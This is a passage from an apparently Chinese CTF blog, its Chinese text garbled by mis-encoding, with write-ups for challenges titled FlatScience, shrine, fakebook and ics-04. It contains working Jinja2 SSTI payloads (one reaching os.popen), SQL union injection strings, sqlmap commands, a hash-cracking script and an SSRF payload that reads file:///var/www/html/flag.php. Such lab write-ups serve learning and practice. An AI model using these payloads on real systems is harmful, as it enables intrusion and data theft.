æ‰§è¡Œpopené‡Œçš„å‘½ä»¤ readè¯»å‡ºæ•°æ®</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line">2ï¼‰</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;ls &#x2F;&#39;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸€äº›è¡¥å……ï¼š</p>
<h3 id="flaskçš„å˜é‡å’Œå‡½æ•°"><a href="#flaskçš„å˜é‡å’Œå‡½æ•°" class="headerlink" title="flaskçš„å˜é‡å’Œå‡½æ•°"></a>flaskçš„å˜é‡å’Œå‡½æ•°</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flask ä¸­æœ‰å†…ç½®çš„çš„å˜é‡å‡½æ•° ï¼Œé‚£äº›ç‰¹æ®Šçš„å˜é‡å¯ä»¥å®ç°æŸäº›åŠŸèƒ½</span><br><span class="line"></span><br><span class="line">config ï¼šå¯ä»¥ä»æ¨¡æ¿ä¸­ç›´æ¥è®¿é—®Flaskå½“å‰çš„configå¯¹è±¡ï¼š&#123;&#123;config.SQLALCHEMY_DATABASE_URL&#125;&#125;</span><br><span class="line"></span><br><span class="line">request : å°±æ˜¯flaskä¸­ä»£è¡¨å½“å‰è¯·æ±‚çš„requestå¯¹è±¡ ï¼Œ &#123;&#123;request.url&#125;&#125;</span><br><span class="line"></span><br><span class="line">session :ä¸ºFlaskçš„sessionå¯¹è±¡ ,&#123;&#123;session.new&#125;&#125; True</span><br><span class="line"></span><br><span class="line">gå˜é‡ï¼šåœ¨è§†å›¾å‡½æ•°ä¸­è®¾ç½®gå˜é‡çš„é‚£ä¹ˆå±æ€§çš„å€¼ï¼Œç„¶åå†æ¨¡æ¿ä¸­ç›´æ¥å¯ä»¥å–å‡º&#123;&#123;g.name&#125;&#125;</span><br><span class="line"></span><br><span class="line">url_for() : url_forä¼šæ ¹æ®ä¼ å…¥çš„è·¯ç”±å™¨å‡½æ•°åï¼Œè¿”å›è¯¥è·¯ç”±çš„URLï¼Œåœ¨æ¨¡æ¿ä¸­å§‹ç»ˆä½¿ç”¨url_forï¼ˆï¼‰å°±å¯ä»¥å®‰å…¨çš„ä¿®æ”¹è·¯ç”±ç»‘å®šçš„URLï¼Œåˆ™ä¸å¿…æ‹…å¿ƒæ¨¡æ¿ä¸­æ¸²æŸ“é”™çš„è¿æ¥ï¼Œ&#123;&#123;url_for(&#39;home&#39;)&#125;&#125; ï¼Œå¦‚æœæˆ‘ä»¬å®šä¹‰çš„è·¯ç”±URLæ˜¯å¸¦æœ‰å‚æ•°çš„ï¼Œåˆ™å¯ä»¥æŠŠä»–ä»¬ä½œä¸ºå…³é”®å­—å‚æ•°ä¼ å…¥url_forï¼ˆï¼‰ï¼ŒFlaskä¼šæŠŠä»–ä»¬å¡«å……è¿›æœ€ç»ˆç”Ÿæˆçš„URLä¸­ï¼Œ&#123;&#123;url_for(&#39;post&#39;,post_id&#x3D;1)&#125;&#125;</span><br><span class="line"></span><br><span class="line">get_flashed_messages():è¿™ä¸ªå‡½æ•°ä¼šè¿”å›ä¹‹å‰åœ¨flaskä¸­é€šè¿‡flaskï¼ˆï¼‰ä¼ å…¥çš„æ¶ˆæ¯çš„åˆ—è¡¨ï¼Œflashå‡½æ•°çš„ä½œç”¨å¾ˆç®€å•ï¼Œå¯ä»¥æŠŠç”±Pythonå­—ç¬¦ä¸²è¡¨ç¤ºçš„ä¿¡æ¯åŠ å…¥ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ä¸­ï¼Œåœ¨ä½¿get_flashed_message()å‡½æ•°å–å‡ºä»–ä»¬å¹¶æ¶ˆè´¹æ‰</span><br><span class="line"></span><br><span class="line">&#123;%for message in get_flashed_messages()%&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;message&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>æ¨¡æ¿æ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>æ”»é˜²daliy</title>
    <url>/2020/03/11/%E6%94%BB%E9%98%B2daliy/</url>
    <content><![CDATA[<h4 id="0X01-FlatScience-20-03-11"><a href="#0X01-FlatScience-20-03-11" class="headerlink" title="0X01: FlatScience 20-03-11"></a>0X01: FlatScience 20-03-11<a id="more"></a></h4><p>æ‹¿åˆ°ç½‘é¡µï¼Œæ­£å¸¸æ“ä½œscanæ‰«ä¸€å‘</p>
<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/1.png" class="">



<p>è®¿é—®login.phpé¡µé¢ï¼ŒæŸ¥çœ‹ç½‘é¡µæºç ï¼Œæœ‰æç¤º</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- <span class="doctag">TODO:</span> Remove ?debug-Parameter! --&gt;</span></span><br></pre></td></tr></table></figure>

<p>é‡æ–°è®¿é—®login.php?debug,æ‹¿åˆ°äº†æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'usr'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'pw'</span>]))&#123;</span><br><span class="line">        $user = $_POST[<span class="string">'usr'</span>];</span><br><span class="line">        $pass = $_POST[<span class="string">'pw'</span>];</span><br><span class="line"></span><br><span class="line">        $db = <span class="keyword">new</span> SQLite3(<span class="string">'../fancy.db'</span>);</span><br><span class="line">        </span><br><span class="line">        $res = $db-&gt;query(<span class="string">"SELECT id,name from Users where name='"</span>.$user.<span class="string">"' and password='"</span>.sha1($pass.<span class="string">"Salz!"</span>).<span class="string">"'"</span>);</span><br><span class="line">    <span class="keyword">if</span>($res)&#123;</span><br><span class="line">        $row = $res-&gt;fetchArray();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;Some Error occourred!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($row[<span class="string">'id'</span>]))&#123;</span><br><span class="line">            setcookie(<span class="string">'name'</span>,<span class="string">' '</span>.$row[<span class="string">'name'</span>], time() + <span class="number">60</span>, <span class="string">'/'</span>);</span><br><span class="line">            header(<span class="string">"Location: /"</span>);</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'debug'</span>]))</span><br><span class="line">highlight_file(<span class="string">'login.php'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°æ˜¯SQLite3ï¼ŒæŸ¥æ‰¾èµ„æ–™çŸ¥é“sqliteè‡ªå¸¦çš„ç»“æ„è¡¨sqlite_masterï¼Œsqlæ˜¯sqlite_masterä¸­çš„ä¸€ä¸ªå­—æ®µï¼Œæ³¨å…¥æ—¶ç»å¸¸ç”¨åˆ°çš„</p>
<p>ä¸‹é¢å°±æ˜¯ç”¨sqlè¿›è¡Œå¯¹æ•°æ®åº“çš„æŸ¥è¯¢</p>
<p><code>usr=1&#39; union select name,sql from sqlite_master--+&amp;pw=</code></p>
<p>å¯ä»¥å¾—åˆ°set-cookie:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">Users</span>(</span><br><span class="line"><span class="keyword">id</span> <span class="built_in">int</span> primary <span class="keyword">key</span>,</span><br><span class="line"><span class="keyword">name</span> <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line"><span class="keyword">password</span> <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line">hint <span class="built_in">varchar</span>(<span class="number">255</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢å°±æ˜¯åˆ†åˆ«æŸ¥è¯¢ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">`usr=1' union <span class="keyword">select</span> <span class="keyword">id</span>,<span class="keyword">name</span> <span class="keyword">from</span> <span class="keyword">Users</span><span class="comment">--+&amp;pw=`  ----name=+admin</span></span><br><span class="line"><span class="string">`usr=1' union select id,password from Users--+&amp;pw=`</span> <span class="comment">----name=+3fab54a50e770d830c0416df817567662a9dc85c;</span></span><br><span class="line"><span class="string">`usr=1' union select id,hint from Users--+&amp;pw=`</span><span class="comment">----name=+my+fav+word+in+my+fav+paper%3F%21;</span></span><br></pre></td></tr></table></figure>

<p>ç»“åˆä¸Šé¢çš„æºç ä»¥åŠç»™å‡ºçš„hintï¼Œpassword=str(unknown).â€Salz!â€,åº”è¯¥è¦ç”¨å·²çŸ¥çš„å¯†ç åœ¨é¢˜ç›®ç»™å‡ºçš„æ–‡æ¡£ä¸­æ‰¾å‡ºåŠ å¯†åç›¸åŒçš„é‚£æ®µå­—ç¬¦ä¸²ï¼Œä¹Ÿå°±æ˜¯è¿›è¡Œç¢°æ’ï¼Œä¸‹é¢ç»™å‡ºå¤§ä½¬çš„è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> cStringIO <span class="keyword">import</span> StringIO</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfinterp <span class="keyword">import</span> PDFResourceManager, PDFPageInterpreter</span><br><span class="line"><span class="keyword">from</span> pdfminer.converter <span class="keyword">import</span> TextConverter</span><br><span class="line"><span class="keyword">from</span> pdfminer.layout <span class="keyword">import</span> LAParams</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfpage <span class="keyword">import</span> PDFPage</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pdf</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">return</span> [i <span class="keyword">for</span> i <span class="keyword">in</span> os.listdir(<span class="string">"./"</span>) <span class="keyword">if</span> i.endswith(<span class="string">"pdf"</span>)]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert_pdf_2_text</span><span class="params">(path)</span>:</span></span><br><span class="line">    rsrcmgr = PDFResourceManager()</span><br><span class="line">    retstr = StringIO()</span><br><span class="line">    device = TextConverter(rsrcmgr, retstr, codec=<span class="string">'utf-8'</span>, laparams=LAParams())</span><br><span class="line">    interpreter = PDFPageInterpreter(rsrcmgr, device)</span><br><span class="line">    <span class="keyword">with</span> open(path, <span class="string">'rb'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        <span class="keyword">for</span> page <span class="keyword">in</span> PDFPage.get_pages(fp, set()):</span><br><span class="line">            interpreter.process_page(page)</span><br><span class="line">        text = retstr.getvalue()</span><br><span class="line">    device.close()</span><br><span class="line">    retstr.close()</span><br><span class="line">    <span class="keyword">return</span> text</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_password</span><span class="params">()</span>:</span></span><br><span class="line">	pdf_path = get_pdf()</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> pdf_path:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"Searching word in "</span> + i</span><br><span class="line">		pdf_text = convert_pdf_2_text(i).split(<span class="string">" "</span>)</span><br><span class="line">		<span class="keyword">for</span> word <span class="keyword">in</span> pdf_text:</span><br><span class="line">			sha1_password = hashlib.sha1(word+<span class="string">"Salz!"</span>).hexdigest()</span><br><span class="line">			<span class="keyword">if</span> sha1_password == <span class="string">'3fab54a50e770d830c0416df817567662a9dc85c'</span>:</span><br><span class="line">				<span class="keyword">print</span> <span class="string">"Find the password :"</span> + word</span><br><span class="line">				exit()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">	find_password()</span><br></pre></td></tr></table></figure>

<p>è·‘å‡ºçš„å¯†ç ä¸ºThinJerboaï¼Œåœ¨admin.phpé¡µé¢ç™»å½•å°±å¯ä»¥æ‹¿åˆ°flag</p>
<p>ï¼ˆè¿˜æœ‰ä¸€ç§æ–¹æ³•æ˜¯è¿™æ®µå¯†ç åˆšå¥½å¯ä»¥è¿›è¡Œmd5è§£å¯†ï¼Œå»æ‰é¢˜ç›®ç»™å‡ºçš„é‚£éƒ¨åˆ†åˆšå¥½æ˜¯ThinJerboaï¼‰</p>
<h4 id="0X02-shrine-20-03-12"><a href="#0X02-shrine-20-03-12" class="headerlink" title="0X02:shrine 20-03-12"></a>0X02:shrine 20-03-12</h4><p>æ‰“å¼€ç½‘é¡µï¼Œæ•´ç†ä¸€ä¸‹ç»™å‡ºçš„pythonä»£ç </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">app.config[<span class="string">'FLAG'</span>] = os.environ.pop(<span class="string">'FLAG'</span>)</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"><span class="meta">@app.route('/shrine/&lt;path:shrine&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span><span class="params">(shrine)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span><span class="params">(s)</span>:</span></span><br><span class="line">        s = s.replace(<span class="string">'('</span>, <span class="string">''</span>).replace(<span class="string">')'</span>, <span class="string">''</span>)</span><br><span class="line">        blacklist = [<span class="string">'config'</span>, <span class="string">'self'</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>å®¡ä¸€ä¸‹ï¼Œå‘ç°â€™()â€™ä¼šè¢«æ›¿æ¢ä¸ºç©ºï¼Œåœ¨blacklistä¸­çš„ä¼šè¢«ç½®ä¸ºNoneï¼Œæäº¤çš„å‚æ•°åœ¨/shrine/çš„è·¯å¾„ä¸‹</p>
<p>ä¸‹é¢æ¥è¿›è¡Œä¸€ä¸‹æµ‹è¯•</p>
<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/2.png" class="">

<p>é€šè¿‡æŸ¥é˜…SSTIæ¨¡æ¿å¼•æ“æ³¨å…¥å›¾å¯ä»¥çŸ¥é“åº”è¯¥æ˜¯jinja2+flask</p>
<p>ç”±äºè¿™é‡Œçš„å˜é‡configè¢«ç¦ç”¨ï¼Œæš‚æ—¶æ²¡æƒ³åˆ°ä»€ä¹ˆåŠæ³•ï¼Œçœ‹äº†å…¶ä»–å¸ˆå‚…çš„wpï¼ŒçŸ¥é“äº†è¦ç”¨pythonçš„æ²™ç®±é€ƒé€¸æ–¹æ³•ï¼ŒæŸ¥äº†æœ‰å…³flaskçš„å†…ç½®å‡½æ•°ï¼Œä»¥ä¸‹æ˜¯èµ„æ–™</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url_for() : url_forä¼šæ ¹æ®ä¼ å…¥çš„è·¯ç”±å™¨å‡½æ•°åï¼Œè¿”å›è¯¥è·¯ç”±çš„URLï¼Œåœ¨æ¨¡æ¿ä¸­å§‹ç»ˆä½¿ç”¨url_forï¼ˆï¼‰å°±å¯ä»¥å®‰å…¨çš„ä¿®æ”¹è·¯ç”±ç»‘å®šçš„URLï¼Œåˆ™ä¸å¿…æ‹…å¿ƒæ¨¡æ¿ä¸­æ¸²æŸ“é”™çš„è¿æ¥ï¼Œ&#123;&#123;url_for(&#39;home&#39;)&#125;&#125; ï¼Œå¦‚æœæˆ‘ä»¬å®šä¹‰çš„è·¯ç”±URLæ˜¯å¸¦æœ‰å‚æ•°çš„ï¼Œåˆ™å¯ä»¥æŠŠä»–ä»¬ä½œä¸ºå…³é”®å­—å‚æ•°ä¼ å…¥url_forï¼ˆï¼‰ï¼ŒFlaskä¼šæŠŠä»–ä»¬å¡«å……è¿›æœ€ç»ˆç”Ÿæˆçš„URLä¸­ï¼Œ&#123;&#123;url_for(&#39;post&#39;,post_id&#x3D;1)&#125;&#125;</span><br><span class="line"></span><br><span class="line">get_flashed_messages():è¿™ä¸ªå‡½æ•°ä¼šè¿”å›ä¹‹å‰åœ¨flaskä¸­é€šè¿‡flaskï¼ˆï¼‰ä¼ å…¥çš„æ¶ˆæ¯çš„åˆ—è¡¨ï¼Œflashå‡½æ•°çš„ä½œç”¨å¾ˆç®€å•ï¼Œå¯ä»¥æŠŠç”±Pythonå­—ç¬¦ä¸²è¡¨ç¤ºçš„ä¿¡æ¯åŠ å…¥ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ä¸­ï¼Œåœ¨ä½¿get_flashed_message()å‡½æ•°å–å‡ºä»–ä»¬å¹¶æ¶ˆè´¹æ‰</span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢ç”¨get_flashed_messages()çš„æ–¹æ³•</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload:&#123;&#123;get_flashed_messages.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure>

<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/3.png" class="">

<p>å¯ä»¥æ‰¾åˆ°current_app,ç»§ç»­æ³¨å…¥å½“å‰appçš„config</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:&#123;&#123;get_fiashed_messages.__globals__[&#39;current_app&#39;].config&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥æ‰¾åˆ°flagï¼Œè¿™é‡Œå°±ä¸è´´äº†</p>
<h4 id="0X03-fakebook-20-03-13"><a href="#0X03-fakebook-20-03-13" class="headerlink" title="0X03:fakebook 20-03-13"></a>0X03:fakebook 20-03-13</h4><p>æ‹¿åˆ°é¢˜ç›®ï¼Œscanå†²ä¸€å‘</p>
<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/4.png" class="">

<p>å‘ç°æœ‰robots.txtï¼Œè®¿é—®ï¼Œä¸‹è½½æºç user.php.bak</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, $age, $blog)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (int)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å®¡é˜…æºç å‘ç°get()å¯èƒ½å­˜åœ¨ssrfæœåŠ¡ç«¯æ¥¼çš„é‚£ä¸ªï¼Œjoinä¸€ä¸ªè´¦å·,ç‚¹usernameé¡µé¢è·³è½¬ï¼Œå‘ç°ä¸€ä¸ªæ³¨å…¥ç‚¹</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://111.198.29.45:44796/view.php?no=1</span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢å¼€å§‹æ³¨å…¥æµ‹è¯•ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">no=1 order by 5<span class="comment">#//æŠ¥é”™ï¼Œè¯´æ˜æ²¡æœ‰äº”ä¸ªå­—æ®µï¼Œå¹¶ä¸”çˆ†å‡ºäº†è·¯å¾„åœ¨ /var/www/html/db.phpä¸‹</span></span><br><span class="line">no=1 order by 5<span class="comment">#//æ­£å¸¸å›æ˜¾ï¼Œè¯´æ˜æ˜¯4ä¸ªå­—æ®µï¼Œä¸‹é¢å¼€å§‹çˆ†åº“</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæœ‰ä¸€ä¸ªæ³¨æ„çš„åœ°æ–¹å°±æ˜¯,ç»è¿‡å¤šæ¬¡æµ‹è¯•å‘ç°union å’Œselectä¸èƒ½åŒæ—¶ä½¿ç”¨ï¼Œç”¨æ³¨é‡Š/**/è¿›è¡Œç»•è¿‡</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">no = -1 union<span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(schema_name),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.schemata<span class="comment">#//çˆ†å‡ºfakebookåº“</span></span><br><span class="line"><span class="keyword">no</span>= <span class="number">-1</span> <span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'fakebook'</span><span class="comment">#//çˆ†å‡ºusersè¡¨</span></span><br><span class="line"><span class="keyword">no</span> = <span class="number">-1</span> <span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span><span class="comment">#çˆ†å‡ºno,username,passwd,dataå­—æ®µ</span></span><br><span class="line">ä¸‹é¢å¯ä»¥ä¸€ä¸ªä¸ªæŸ¥è¯¢ä¿¡æ¯ï¼Œå¯ä»¥çœ‹åˆ°<span class="keyword">data</span>ä¸­çš„æ•°æ®è¿›è¡Œäº†åºåˆ—åŒ–</span><br><span class="line">O:8:"UserInfo":3&#123;s:4:"name";s:7:"hjfashd";s:3:"age";i:1123;s:4:"blog";s:13:"www.baidu.com";&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨ç›®å½•æ‰«æä¸­å¯ä»¥çœ‹åˆ°å­˜åœ¨flag.phpï¼Œå¯ä»¥æŠŠblogæ”¹ä¸º/var/www/html/flag.phpè·¯å¾„å°±å¯ä»¥æ‹¿åˆ°flagäº†,è¿™é‡Œè¿˜è¦æ³¨æ„ç”¨fileï¼š//åè®®æ¥è¯»å–,æ­¤å¤–dataåœ¨ç¬¬å››ä¸ªå­—æ®µï¼Œæ‰€ä»¥è¿™é‡ŒæŸ¥è¯¢æ—¶ä¹Ÿè¦æ”¾åœ¨ç¬¬å››ä½</p>
<p>åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬å°±å¯ä»¥æ ¹æ®å·²çŸ¥çš„ä¿¡æ¯æ¥æ„é€ payload</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">payload:no=-1 union<span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">'O:8:"UserInfo":3:&#123;s:4:"name";s:3:"ggg";s:3:"age";i:12356;s:4:"blog";s:29:"file:///var/www/html/flag.php";&#125;'</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹ç½‘é¡µæºç ï¼Œå¯ä»¥çœ‹åˆ°</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">src='data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3tjMWU1NTJmZGY3NzA0OWZhYmY2NTE2OGYyMmY3YWVhYn0iOw0KZXhpdCgwKTsNCg=='&gt;//base64è§£ç å°±å¯ä»¥äº†</span><br></pre></td></tr></table></figure>

<h4 id="0X04ics-04-20-03-14"><a href="#0X04ics-04-20-03-14" class="headerlink" title="0X04ics-04 20-03-14"></a>0X04ics-04 20-03-14</h4><p>æ ¹æ®é¢˜ç›®æè¿°ï¼Œåœ¨æ³¨å†Œå’Œç™»å½•é¡µé¢å­˜åœ¨æ¼æ´ï¼Œæ³¨å†Œä¸€ä¸ªè´¦å·ç™»å½•ï¼Œæç¤ºè¯´æ™®é€šç”¨æˆ·ç™»å½•æˆåŠŸä½†æ²¡ä»€ä¹ˆç”¨ï¼Œçœ‹æ¥æ˜¯è¦æ‹¿åˆ°ç®¡ç†å‘˜çš„è´¦å·ï¼Œè¿™é‡Œæœ‰ä¸ªå¿˜è®°å¯†ç çš„é¡µé¢ï¼Œä½†å¥½åƒæš‚æ—¶æ²¡ä»€ä¹ˆç”¨</p>
<p>ä¸Šå·¥å…·ï¼Œç”¨sqlmapè¿›è¡Œå°è¯•</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;111.198.29.45:51961&#x2F;findpwd.php&quot; --data&#x3D;&quot;username&#x3D;a&quot; --dbs&#x2F;&#x2F;çˆ†å‡ºäº†å››ä¸ªåº“ï¼Œç»è¿‡å°è¯•å‘ç°æ‰€è¦çš„æ•°æ®åœ¨cetc004ä¸­</span><br><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;111.198.29.45:51961&#x2F;findpwd.php&quot; --data&#x3D;&quot;username&#x3D;a&quot; -D cetc004 --tables&#x2F;&#x2F;çˆ†å‡ºuserè¡¨</span><br><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;111.198.29.45:51961&#x2F;findpwd.php&quot; --data&#x3D;&quot;username&#x3D;a&quot; -D cetc004 -T user --columns&#x2F;&#x2F;çˆ†å‡ºå››ä¸ªå­—æ®µï¼Œanswerï¼Œquestionï¼Œpasswordï¼Œusername</span><br></pre></td></tr></table></figure>

<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/5.png" class="">

<p>å¯ä»¥çœ‹åˆ°å·²ç»å­˜åœ¨çš„è´¦æˆ·ä¿¡æ¯ï¼Œå¯†ç è¢«åŠ å¯†äº†ï¼Œæœªæ‰¾åˆ°è§£å¯†æ–¹æ³•ï¼Œå›åˆ°æ³¨å†Œå’Œç™»å½•é¡µé¢</p>
<p>ç»è¿‡æµ‹è¯•å‘ç°æ³¨å†Œé¡µé¢ç›¸åŒçš„è´¦æˆ·åå¯ä»¥æ³¨å†Œå¤šæ¬¡ï¼Œç™»å½•ç•Œé¢åŒè´¦æˆ·ä¸åŒå¯†ç éƒ½å¯ä»¥æˆåŠŸç™»å½•</p>
<p>æ³¨å†Œä¸€ä¸ªåä¸ºc3tlwDmIn23çš„æ–°è´¦æˆ·ç™»å½•å°±èƒ½æ‹¿åˆ°flag</p>
